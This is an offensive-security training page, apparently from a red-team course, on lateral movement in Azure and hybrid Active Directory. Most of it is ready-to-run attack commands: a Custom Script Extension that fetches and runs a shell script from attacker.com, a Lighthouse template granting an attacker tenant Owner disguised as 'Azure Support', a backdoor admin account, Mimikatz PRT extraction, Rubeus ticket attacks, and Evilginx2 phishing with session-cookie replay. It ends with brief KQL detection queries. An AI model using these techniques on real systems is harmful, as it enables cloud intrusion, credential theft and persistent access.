---
layout: training-page
title: "Azure Lateral Movement — Red Team Academy"
module: "Active Directory"
tags:
  - azure-ad
  - lateral-movement
  - azure-lighthouse
  - azure-arc
  - token-replay
  - managed-identity
  - hybrid-cloud
page_key: "ad-azure-lateral-movement"
render_with_liquid: false
---

# Azure Lateral Movement

Azure lateral movement involves pivoting between cloud resources, across tenant boundaries (via Azure Lighthouse), from cloud to on-prem (via Azure Arc), and within hybrid environments using token replay and shared credential reuse. The cloud attack surface extends traditional lateral movement techniques into identity-driven paths.

## Cloud-to-Cloud Lateral Movement

### Token Replay Across Services

A token issued for one Azure service may be replayable against others if the audience (`aud` claim) is permissive or if the attacker can exchange it.

```bash
# Decode a JWT to check claims (aud, scp, roles, oid)
echo "<token>" | python3 -c "
import sys, base64, json
parts = sys.stdin.read().strip().split('.')
payload = parts[1] + '=='  # pad
decoded = json.loads(base64.b64decode(payload))
print(json.dumps(decoded, indent=2))
"

# Valid Graph API token → try Azure Management API (different audience)
curl -H "Authorization: Bearer <graph_token>" \
     "https://management.azure.com/subscriptions?api-version=2020-01-01"

# Use AADInternals to upgrade access token scope
Import-Module .\AADInternals.ps1
$newToken = Get-AADIntAccessTokenForAzureCoreManagement -RefreshToken "<refresh_token>"
```

### Shared Credential Pivoting

Service accounts, automation scripts, and pipeline credentials are frequently shared or reused. Targeting these enables pivoting across resources.

```powershell
# Search source code and configuration files for credentials
# (after gaining initial access to a DevOps repo, storage account, or VM)
grep -r "password\|secret\|apikey\|connectionstring" /path/to/repo --include="*.json"
grep -r "client_secret\|AZURE_" /path/to/repo --include="*.yml"

# Azure Key Vault — if you have access, list and read secrets
az keyvault list --query "[].name"
az keyvault secret list --vault-name "<vault-name>"
az keyvault secret show --vault-name "<vault-name>" --name "<secret-name>"
```

---

## Azure Lighthouse — Cross-Tenant Lateral Movement

Azure Lighthouse enables service providers to manage customer tenants via delegated ARM (Azure Resource Manager) access. A misconfigured or compromised Lighthouse delegation grants attackers management access to a victim tenant from an attacker-controlled tenant.

### How Lighthouse Delegation Works

1. The **managing tenant** creates an ARM template defining which principals get which roles
2. The **managed tenant** accepts the delegation (deploys the ARM template)
3. The managing tenant's users/groups can then operate in the managed tenant with those roles

### Abusing a Lighthouse Delegation

```bash
# From the managing (attacker-controlled) tenant
# List all tenants you have delegated access to
az managedservices definition list
az managedservices assignment list

# Switch context to the managed tenant
az account set --tenant "<managed_tenant_id>"

# List resources in the managed tenant
az resource list --query "[].{name:name, type:type, resourceGroup:resourceGroup}"

# List VMs in the managed tenant
az vm list --query "[].{name:name, resourceGroup:resourceGroup}"

# If the delegation includes Contributor or Owner:
# Execute commands on VMs
az vm run-command invoke \
    --resource-group "<rg-name>" \
    --name "<vm-name>" \
    --command-id RunPowerShellScript \
    --scripts "whoami; hostname; ipconfig"
```

### Deploying a Malicious Lighthouse Template

If you have Owner access on a target tenant:

```json
{
  "$schema": "https://schema.management.azure.com/schemas/2019-08-01/subscriptionDeploymentTemplate.json#",
  "contentVersion": "1.0.0.0",
  "resources": [{
    "type": "Microsoft.ManagedServices/registrationDefinitions",
    "apiVersion": "2019-09-01",
    "name": "<guid>",
    "properties": {
      "registrationDefinitionName": "Azure Management",
      "managedByTenantId": "<attacker_tenant_id>",
      "authorizations": [{
        "principalId": "<attacker_user_object_id>",
        "principalIdDisplayName": "Azure Support",
        "roleDefinitionId": "8e3af657-a8ff-443c-a75c-2fe8c4bcb635"
      }]
    }
  }]
}
```

```bash
# Deploy the template to victim subscription (requires Owner on victim subscription)
az deployment sub create \
    --location "eastus" \
    --template-file malicious_lighthouse.json

# Detection: List existing Lighthouse assignments
az managedservices assignment list --subscription "<victim_sub_id>"
```

---

## Azure Arc — Cloud to On-Premises Pivot

Azure Arc extends Azure management plane to on-premises servers, Kubernetes clusters, and other cloud providers. An attacker with sufficient Azure permissions can use Arc to execute commands on registered on-prem machines.

### Arc Custom Script Extension — On-Prem Code Execution

```bash
# List all Arc-registered machines (on-prem servers managed via Azure)
az connectedmachine list --query "[].{name:name, os:osName, status:status}"

# Execute commands on Arc machines via Custom Script Extension
az connectedmachine extension create \
    --resource-group "<rg-name>" \
    --machine-name "<arc-machine-name>" \
    --name "CustomScript" \
    --type "CustomScriptExtension" \
    --publisher "Microsoft.Compute" \
    --settings '{"commandToExecute": "powershell -c \"IEX(New-Object Net.WebClient).DownloadString('"'"'http://attacker.com/shell.ps1'"'"')\""}' \
    --location "eastus"
```

### Arc Managed Identity — Pivot from Cloud to On-Prem

Arc-enrolled machines receive a Managed Identity. From an on-prem machine enrolled in Arc, the MSI endpoint provides Azure tokens.

```bash
# On the Arc-enrolled on-prem machine:
# Get MSI token for Azure management
curl -H "Metadata: true" \
     "http://127.0.0.1:40342/metadata/identity/oauth2/token?api-version=2019-11-01&resource=https://management.azure.com/"

# The MSI may have Contributor or higher RBAC → pivot to cloud resources
# Use the token to access Key Vaults, Storage, or other cloud resources
curl -H "Authorization: Bearer <msi_token>" \
     "https://management.azure.com/subscriptions?api-version=2020-01-01"
```

---

## Pass-the-Hash and Pass-the-Ticket in Hybrid Environments

### Azure AD-Joined Machines — PRT Theft

Primary Refresh Tokens (PRTs) are issued to Azure AD-joined and hybrid-joined machines. Stealing a PRT allows impersonation on Azure AD and M365.

```
# Mimikatz — extract PRT from LSASS
privilege::debug
sekurlsa::cloudap

# Extract from NGC key container
sekurlsa::wdigest

# BrowserStealer / RequestAADRefreshToken — PRT → Azure token
# Use the PRT to get an access token without MFA
Import-Module .\AADInternals.ps1
Get-AADIntAccessTokenFromPRT -PRT "<prt_value>" -Context "<context_value>"
```

### Kerberos Delegation Attacks in Hybrid Context

Unconstrained delegation in on-prem AD allows capturing TGTs, which can be used for Kerberos-based Azure AD authentication in hybrid setups.

```
# Find computers with unconstrained delegation
Import-Module .\PowerView.ps1
Get-DomainComputer -Unconstrained | Select Name, DNSHostName

# Coerce a domain controller to authenticate to unconstrained delegation host
# using PrinterBug or PetitPotam
.\SpoolSample.exe <dc-hostname> <delegation-host>

# Capture the TGT with Rubeus on the delegation host
.\Rubeus.exe monitor /interval:5

# Pass the TGT to access cloud resources (if the DC is hybrid-joined)
```

### Cross-Domain and Cross-Forest Token Attacks

```powershell
# In trust relationships, escalate across domains
# List trusts
Get-DomainTrust | Select SourceName, TargetName, TrustType, TrustDirection

# Request inter-realm TGT
.\Rubeus.exe asktgt /user:admin /domain:child.victim.com /password:<hash> /ptt

# Access parent domain resources
ls \\parent.victim.com\admin$
```

---

## Token Replay and Cookie Reuse

### Intercepting Tokens via AiTM Proxy

Adversary-in-the-Middle (AiTM) frameworks capture session tokens during MFA authentication flows — the user completes MFA legitimately, but the attacker receives the authenticated session token.

```bash
# Evilginx2 — AiTM framework
# Configure a phishlet for Microsoft 365
# Edit phishlets/o365.yaml

# Start Evilginx2
./evilginx2 -c /root/.evilginx -d yourdomain.com

# Configure phishlet
phishlets hostname o365 login.attacker.com
phishlets enable o365
lures create o365

# Session tokens are captured and stored
sessions

# Export captured cookies for replay
sessions 1
```

### Replaying Captured Session Cookies

```python
# Use captured cookies to access Azure portal without credentials
import requests

# Set cookies from captured session
cookies = {
    "ESTSAUTH": "<captured_ests_auth_cookie>",
    "ESTSAUTHPERSISTENT": "<captured_ests_persistent_cookie>"
}

# Access Microsoft Graph with session cookies
response = requests.get(
    "https://graph.microsoft.com/v1.0/me",
    cookies=cookies
)
print(response.json())
```

---

## Lateral Movement via Command Execution

### PowerShell Remoting to Azure-Joined Machines

```powershell
# If you have credentials for an Azure-joined machine (via LAPS or credential dump)
# Enable PS Remoting (if not enabled)
Enable-PSRemoting -Force

# Remote into target (Azure AD accounts use UPN format)
$cred = Get-Credential  # user@tenant.onmicrosoft.com
Enter-PSSession -ComputerName "TARGET-PC" -Credential $cred

# Or use Invoke-Command for bulk execution
Invoke-Command -ComputerName @("PC1","PC2","PC3") -Credential $cred -ScriptBlock {
    whoami; Get-Process
}
```

### Azure VM Run Command

```bash
# Execute commands on Azure VMs without network connectivity
# Requires Contributor or VM Contributor role on the VM
az vm run-command invoke \
    --resource-group "rg-prod" \
    --name "win-server-01" \
    --command-id RunPowerShellScript \
    --scripts "
        \$env:COMPUTERNAME
        net user backdoor P@ssw0rd123! /add
        net localgroup administrators backdoor /add
    "
```

---

## Detection

```
// Detect Lighthouse assignment creation or modification
AzureActivity
| where OperationNameValue == "microsoft.managedservices/registrationassignments/write"
| project TimeGenerated, Caller, ResourceGroup, Properties

// Detect Arc Custom Script Extension creation
AzureActivity
| where ResourceProviderValue == "MICROSOFT.HYBRIDCOMPUTE"
| where OperationNameValue contains "extensions/write"
| project TimeGenerated, Caller, Resource, Properties

// Detect suspicious VM Run Command
AzureActivity
| where OperationNameValue == "microsoft.compute/virtualmachines/runcommand/action"
| project TimeGenerated, Caller, Resource, Properties

// Detect token use from unusual locations
SigninLogs
| where LocationDetails.countryOrRegion != "US"  // adjust to expected region
| where AppDisplayName == "Microsoft Azure Management"
| project TimeGenerated, UserPrincipalName, IPAddress, Location
```

## Resources

- AADInternals — `github.com/Gerenios/AADInternals`
- Evilginx2 — `github.com/kgretzky/evilginx2`
- Azure Lighthouse docs — `learn.microsoft.com/en-us/azure/lighthouse/`
- Azure Arc documentation — `learn.microsoft.com/en-us/azure/azure-arc/`
- Rubeus — `github.com/GhostPack/Rubeus`
- TokenTacticsV2 — `github.com/f-bader/TokenTacticsV2`
